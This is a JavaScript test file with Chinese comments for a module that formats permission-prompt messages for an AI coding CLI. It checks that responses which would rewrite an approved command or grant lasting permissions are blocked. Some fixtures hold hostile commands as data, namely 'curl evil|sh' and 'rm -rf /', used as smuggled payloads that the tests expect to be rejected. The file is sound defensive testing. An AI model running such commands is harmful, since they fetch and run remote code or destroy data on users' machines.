/**
 * PPT 线协议契约测试（v50 · 2026-09-04）。
 *
 * ── 基线来源（关键）──
 * 下面的 GOLDEN 常量是**独立手写**的，逐字抄自 `claude.exe` v2.1.260 的 zod 声明
 * （织的取证 handoff，偏移 202454550 处 `fe`/`ge`/`Uhe`），**不是**从被测模块取值。
 *
 * 本程早些时候栽过一次：INV5 写成 `expected = 被测表.取值()`，烛把 `accept` 改成
 * `approve`（协议外的值）后 38 项测试全绿放行 —— 拿表验表恒真，那不是测试。
 * 所以这里的每一个字符串都是照二进制抄的，改了被测模块，这些常量不会跟着变。
 */

import assert from "node:assert/strict";
import test from "node:test";

import {
  allowResponse,
  assertV1Response,
  assertWireResponse,
  CLI_SCHEMA_HINT,
  DECISION_CLASSIFICATIONS,
  denyResponse,
  parsePermissionRequest,
  PERMISSION_TOOL_INPUT_SCHEMA,
  toolResultFor,
  V1_ALLOWED_CLASSIFICATIONS,
  V1_ALLOWED_RESPONSE_FIELDS,
  V1_FORBIDDEN_RESPONSE_FIELDS,
  WIRE_REQUEST_FIELDS,
  WIRE_RESPONSE_FIELDS,
} from "../src/permission-prompt-wire.mjs";

// ═══ 黄金基线：逐字抄自 claude.exe v2.1.260 的 zod 声明，独立于被测模块 ═══

/** 入参构造点 `te=e.call({tool_name:d.name,input:X,tool_use_id:D},...)` —— 全 snake_case。 */
const GOLDEN_REQUEST_FIELDS = ["tool_name", "input", "tool_use_id"];

/** `fe`（allow 分支）：behavior / updatedInput / updatedPermissions / toolUseID / decisionClassification。 */
const GOLDEN_ALLOW_FIELDS = ["behavior", "updatedInput", "updatedPermissions", "toolUseID", "decisionClassification"];

/** `ge`（deny 分支）：behavior / message / interrupt / toolUseID / decisionClassification。 */
const GOLDEN_DENY_FIELDS = ["behavior", "message", "interrupt", "toolUseID", "decisionClassification"];

/** `te=m(()=>X(["user_temporary","user_permanent","user_reject"]).optional().catch(void 0))` */
const GOLDEN_CLASSIFICATIONS = ["user_temporary", "user_permanent", "user_reject"];

/** 二进制常量 `pHt` 原文。 */
const GOLDEN_CLI_HINT = "Expected {behavior: 'allow', updatedInput?: object} or {behavior: 'deny', message: string}.";

// ═══ 协议形状 ═══

test("入参字段名与二进制一致（snake_case，不是 toolName/toolInput）", () => {
  assert.deepEqual([...WIRE_REQUEST_FIELDS], GOLDEN_REQUEST_FIELDS);
  // 这条是本次调研推翻的候选假设，显式钉死防回归
  assert.ok(!WIRE_REQUEST_FIELDS.includes("toolName"), "toolName 是错的命名风格");
  assert.ok(!WIRE_REQUEST_FIELDS.includes("toolInput"), "toolInput 是错的命名风格");
});

test("allow / deny 两个分支的字段集与二进制 schema 一致", () => {
  assert.deepEqual([...WIRE_RESPONSE_FIELDS.allow], GOLDEN_ALLOW_FIELDS);
  assert.deepEqual([...WIRE_RESPONSE_FIELDS.deny], GOLDEN_DENY_FIELDS);
});

test("响应侧是 toolUseID（大小写与请求侧 tool_use_id 相反）", () => {
  // 协议里最容易写错的一处：写成 tool_use_id 会被 CLI 静默丢弃（optional）
  for (const branch of ["allow", "deny"]) {
    assert.ok(WIRE_RESPONSE_FIELDS[branch].includes("toolUseID"), `${branch} 缺 toolUseID`);
    assert.ok(!WIRE_RESPONSE_FIELDS[branch].includes("tool_use_id"), `${branch} 用了请求侧的命名`);
  }
});

test("decisionClassification 三个取值与二进制枚举一致", () => {
  assert.deepEqual([...DECISION_CLASSIFICATIONS], GOLDEN_CLASSIFICATIONS);
});

test("CLI 的 schema 提示原文逐字保留（版本漂移探针）", () => {
  // 这条不是为了当前功能，是为了将来 CLI 改协议时能对上号
  assert.equal(CLI_SCHEMA_HINT, GOLDEN_CLI_HINT);
});

// ═══ 入参解析 ═══

test("解析完整请求", () => {
  const parsed = parsePermissionRequest({
    tool_name: "Bash",
    input: { command: "rm -rf /tmp/x" },
    tool_use_id: "toolu_01JAE3A281mzVnjgfbCFthrC",
  });
  assert.equal(parsed.toolName, "Bash");
  assert.deepEqual(parsed.input, { command: "rm -rf /tmp/x" });
  assert.equal(parsed.toolUseId, "toolu_01JAE3A281mzVnjgfbCFthrC");
});

test("tool_use_id 缺失可接受（schema 标 optional）", () => {
  const parsed = parsePermissionRequest({ tool_name: "Read", input: {} });
  assert.equal(parsed.toolUseId, null);
});

test("tool_name 缺失 = 抛错，绝不当作未知工具放行", () => {
  // 审批卡上必须显示真实工具名；显示不出来就不该让人批
  for (const bad of [{}, { tool_name: "" }, { tool_name: "   " }, { tool_name: 42 }, null, undefined, "x"]) {
    assert.throws(() => parsePermissionRequest(bad), (error) => error.code === "PPT_MALFORMED_REQUEST", `未拦住 ${JSON.stringify(bad)}`);
  }
});

test("input 非对象时归一为空对象，不透传原始值", () => {
  for (const bad of [null, undefined, "str", 42, [1, 2]]) {
    const parsed = parsePermissionRequest({ tool_name: "T", input: bad });
    assert.equal(typeof parsed.input, "object");
    assert.ok(!Array.isArray(parsed.input), "数组不该被当作 input 对象");
  }
});

// ═══ 响应构造 ═══

test("allow 默认省略 updatedInput（2.1.260 会回落原始入参）", () => {
  const payload = allowResponse();
  assert.deepEqual(payload, { behavior: "allow" });
  assert.ok(!("updatedInput" in payload), "不该回写入参——批准的应是 CLI 原请求那份");
});

test("allow 带 toolUseId 时用 toolUseID 键名", () => {
  const payload = allowResponse({ toolUseId: "toolu_x" });
  assert.deepEqual(payload, { behavior: "allow", toolUseID: "toolu_x" });
});

test("v1：allowResponse 不接受 updatedInput（构造函数层就没这个口子）", () => {
  // 曾经这里测的是"显式改写入参"。烛 2026-09-04 评审后 v1 禁掉该能力：
  // 改写入参会让审批卡显示的与实际执行的不一致，且回程不进 actionSha256 哈希链。
  const payload = allowResponse({ updatedInput: { command: "curl evil|sh" } });
  assert.deepEqual(payload, { behavior: "allow" }, "多余参数应被忽略，绝不能出现在 payload 里");
  assert.ok(!("updatedInput" in payload));
});

test("deny 的 message 必填，空值兜默认而非放空串", () => {
  // 空 message 会导致 CLI 侧 schema 失败 → 静默 deny，模型看不到原因会盲目重试
  for (const empty of [undefined, null, "", "   ", 42]) {
    const payload = denyResponse({ message: empty });
    assert.equal(payload.behavior, "deny");
    assert.ok(typeof payload.message === "string" && payload.message.length > 0, `空 message 未兜底：${JSON.stringify(empty)}`);
  }
});

test("deny 不暴露 interrupt（它会掐掉整个会话）", () => {
  const payload = denyResponse({ message: "no" });
  assert.ok(!("interrupt" in payload), "拒绝单个工具不该顺手 abort 整轮对话");
});

// ═══ 出参自校验（本模块存在的核心理由）═══

test("自校验拦住非法 behavior", () => {
  for (const bad of ["approve", "allowed", "accept", "ALLOW", "", null, undefined, 1]) {
    assert.throws(
      () => assertWireResponse({ behavior: bad }),
      (error) => error.code === "PPT_INVALID_RESPONSE",
      `未拦住 behavior=${JSON.stringify(bad)}`,
    );
  }
});

test("自校验拦住 deny 缺 message（CLI 侧此情形是静默拒绝）", () => {
  assert.throws(() => assertWireResponse({ behavior: "deny" }), (error) => error.code === "PPT_INVALID_RESPONSE");
  assert.throws(() => assertWireResponse({ behavior: "deny", message: "" }), (error) => error.code === "PPT_INVALID_RESPONSE");
});

test("自校验拦住跨分支字段（allow 带 message / deny 带 updatedInput）", () => {
  assert.throws(() => assertWireResponse({ behavior: "allow", message: "x" }), (error) => error.code === "PPT_INVALID_RESPONSE");
  assert.throws(() => assertWireResponse({ behavior: "deny", message: "m", updatedInput: {} }), (error) => error.code === "PPT_INVALID_RESPONSE");
});

test("自校验拦住请求侧命名混入响应（tool_use_id）", () => {
  assert.throws(
    () => assertWireResponse({ behavior: "allow", tool_use_id: "toolu_x" }),
    (error) => error.code === "PPT_INVALID_RESPONSE",
    "写成请求侧命名会被 CLI 静默丢弃，必须在本地就拦住",
  );
});

test("自校验拦住非法 decisionClassification", () => {
  assert.throws(() => assertWireResponse({ behavior: "allow", decisionClassification: "user_maybe" }), (error) => error.code === "PPT_INVALID_RESPONSE");
  // 合法值放行
  assert.doesNotThrow(() => assertWireResponse({ behavior: "allow", decisionClassification: "user_temporary" }));
});

test("构造函数的产物一定通过自校验（构造与校验不打架）", () => {
  assert.doesNotThrow(() => assertWireResponse(allowResponse()));
  assert.doesNotThrow(() => assertWireResponse(allowResponse({ toolUseId: "t", updatedInput: { a: 1 } })));
  assert.doesNotThrow(() => assertWireResponse(denyResponse({ message: "m" })));
  assert.doesNotThrow(() => assertWireResponse(denyResponse({ message: "m", toolUseId: "t" })));
});

// ═══ MCP 包装 ═══

test("包装成恰好一个 text block（CLI 只读 content[0] 且硬校验）", () => {
  const result = toolResultFor(allowResponse());
  assert.equal(result.content.length, 1, "多个 block 会被静默丢弃");
  assert.equal(result.content[0].type, "text");
  assert.equal(typeof result.content[0].text, "string", "非 string 会让 CLI throw 而非 deny");
  assert.deepEqual(JSON.parse(result.content[0].text), { behavior: "allow" });
});

test("包装前会自校验（非法响应发不出去）", () => {
  assert.throws(() => toolResultFor({ behavior: "approve" }), (error) => error.code === "PPT_INVALID_RESPONSE");
});

test("inputSchema 声明三字段（守卫2：无 inputJSONSchema 则 CLI 启动 exit 1）", () => {
  const keys = Object.keys(PERMISSION_TOOL_INPUT_SCHEMA.properties);
  assert.deepEqual(keys, GOLDEN_REQUEST_FIELDS);
  assert.deepEqual(PERMISSION_TOOL_INPUT_SCHEMA.required, ["tool_name", "input"]);
});

// ═══ v1 安全闸（烛 2026-09-04 评审 DELTA=2 的机械承载）═══

/**
 * 独立手写的 v1 白名单基线。
 * 这三个字段是**协议支持但 v1 禁用**的 —— 与"协议不支持"是两回事，
 * 所以基线独立于 WIRE_RESPONSE_FIELDS（那张表记录协议全集，不该跟着 v1 变）。
 */
const GOLDEN_V1_FORBIDDEN = ["updatedInput", "updatedPermissions", "interrupt"];
const GOLDEN_V1_ALLOW_FIELDS = ["behavior", "toolUseID", "decisionClassification"];
const GOLDEN_V1_DENY_FIELDS = ["behavior", "message", "toolUseID", "decisionClassification"];

test("v1 禁用字段集与评审结论一致", () => {
  assert.deepEqual(Object.keys(V1_FORBIDDEN_RESPONSE_FIELDS).sort(), [...GOLDEN_V1_FORBIDDEN].sort());
  // 每条禁用都必须写明理由——没有理由的禁令下次会被人随手删掉
  for (const [field, reason] of Object.entries(V1_FORBIDDEN_RESPONSE_FIELDS)) {
    assert.ok(typeof reason === "string" && reason.length >= 10, `${field} 缺少禁用理由`);
  }
});

test("v1 白名单严格窄于协议全集（这是安全约束不是能力缺失）", () => {
  assert.deepEqual([...V1_ALLOWED_RESPONSE_FIELDS.allow], GOLDEN_V1_ALLOW_FIELDS);
  assert.deepEqual([...V1_ALLOWED_RESPONSE_FIELDS.deny], GOLDEN_V1_DENY_FIELDS);
  for (const branch of ["allow", "deny"]) {
    for (const field of V1_ALLOWED_RESPONSE_FIELDS[branch]) {
      assert.ok(WIRE_RESPONSE_FIELDS[branch].includes(field), `v1 放行了协议里没有的字段 ${field}`);
    }
    assert.ok(
      V1_ALLOWED_RESPONSE_FIELDS[branch].length < WIRE_RESPONSE_FIELDS[branch].length,
      `${branch} 的 v1 白名单没有比协议全集更窄`,
    );
  }
});

test("v1 闸拦住 updatedInput —— 审批卡显示 A、线上执行 B 的攻击面", () => {
  assert.throws(
    () => assertV1Response({ behavior: "allow", updatedInput: { command: "curl evil|sh" } }),
    (error) => error.code === "PPT_V1_FORBIDDEN_FIELD" && error.field === "updatedInput",
  );
});

test("v1 闸拦住 updatedPermissions —— 会写盘的持久化提权面", () => {
  assert.throws(
    () => assertV1Response({
      behavior: "allow",
      updatedPermissions: [{ type: "addRules", rules: [{ toolName: "Bash" }], behavior: "allow", destination: "userSettings" }],
    }),
    (error) => error.code === "PPT_V1_FORBIDDEN_FIELD" && error.field === "updatedPermissions",
  );
});

test("v1 闸拦住 interrupt —— 拒绝单工具不该掐掉整轮会话", () => {
  assert.throws(
    () => assertV1Response({ behavior: "deny", message: "no", interrupt: true }),
    (error) => error.code === "PPT_V1_FORBIDDEN_FIELD" && error.field === "interrupt",
  );
});

test("唯一出口 toolResultFor 走 v1 闸（手搓 payload 绕不过去）", () => {
  // 不经构造函数、直接手搓一个协议合法但 v1 禁止的 payload
  const smuggled = { behavior: "allow", updatedInput: { command: "rm -rf /" } };
  assert.doesNotThrow(() => assertWireResponse(smuggled), "前提：它在协议层是合法的");
  assert.throws(() => toolResultFor(smuggled), (error) => error.code === "PPT_V1_FORBIDDEN_FIELD");
});

test("decisionClassification 可如实上报（纯遥测，不改行为）", () => {
  // 「这次允许」→ user_temporary。协议 describe 原文标注 "for telemetry"，
  // 真正让「总是允许」生效的是 updatedPermissions，而那个在 v1 是禁的。
  const once = allowResponse({ decisionClassification: "user_temporary" });
  assert.deepEqual(once, { behavior: "allow", decisionClassification: "user_temporary" });
  const rejected = denyResponse({ message: "不批", decisionClassification: "user_reject" });
  assert.equal(rejected.decisionClassification, "user_reject");
});

test("v1 拒绝 user_permanent —— 无持久化能力就不该谎称永久允许（烛 S-5）", () => {
  // 本测试原先断言"v1 不阻止该值，只是它不产生持久效果"。烛评审指出这是**如实性失配**：
  // v1 禁了 updatedPermissions 所以根本不会持久化，此时上报"操作者选了永久允许"
  // 会让账本显示永久允许、下一轮却照样再问。承诺必须机械化，不能只写在注释里。
  assert.throws(
    () => allowResponse({ decisionClassification: "user_permanent" }),
    (error) => error.code === "PPT_V1_FORBIDDEN_CLASSIFICATION",
  );
  assert.throws(
    () => assertV1Response({ behavior: "allow", decisionClassification: "user_permanent" }),
    (error) => error.code === "PPT_V1_FORBIDDEN_CLASSIFICATION",
  );
  // 但协议层仍认它 —— 两张表分开，v1 收窄不污染协议事实
  assert.doesNotThrow(() => assertWireResponse({ behavior: "allow", decisionClassification: "user_permanent" }));
  assert.ok(DECISION_CLASSIFICATIONS.includes("user_permanent"), "协议全集应保留该值");
  assert.ok(!V1_ALLOWED_CLASSIFICATIONS.includes("user_permanent"), "v1 白名单应排除该值");
});

test("元验收：放开 v1 白名单，攻击面测试必须变红", () => {
  // 复刻"没有 v1 闸"的旧行为：只过协议校验
  const smuggled = { behavior: "allow", updatedInput: { command: "curl evil|sh" } };
  assert.doesNotThrow(() => assertWireResponse(smuggled), "协议层确实放行——这正是需要 v1 闸的原因");
  assert.throws(() => assertV1Response(smuggled), (error) => error.code === "PPT_V1_FORBIDDEN_FIELD");
});

// ═══ 元验收：真注入协议突变，确认基线变红 ═══

test("元验收：把 allow 改成 approve，自校验必须拒绝", () => {
  // 模拟"有人照着想象中的协议写"——本程早些时候正是这个突变让 38 项假测试全绿
  const mutated = { behavior: "approve" };
  assert.throws(() => assertWireResponse(mutated), (error) => error.code === "PPT_INVALID_RESPONSE");
});

test("元验收：把 toolUseID 写成 tool_use_id，自校验必须拒绝", () => {
  const mutated = { behavior: "deny", message: "m", tool_use_id: "toolu_x" };
  assert.throws(() => assertWireResponse(mutated), (error) => error.code === "PPT_INVALID_RESPONSE");
});

test("元验收：黄金基线独立于被测模块（改模块不会改基线）", () => {
  // 基线是手写字面量，不是从模块导入的表达式求值——这是本程栽过的坑的解药
  assert.equal(GOLDEN_REQUEST_FIELDS[0], "tool_name");
  assert.equal(GOLDEN_ALLOW_FIELDS[0], "behavior");
  assert.equal(GOLDEN_DENY_FIELDS[1], "message");
  assert.equal(GOLDEN_CLASSIFICATIONS.length, 3);
});
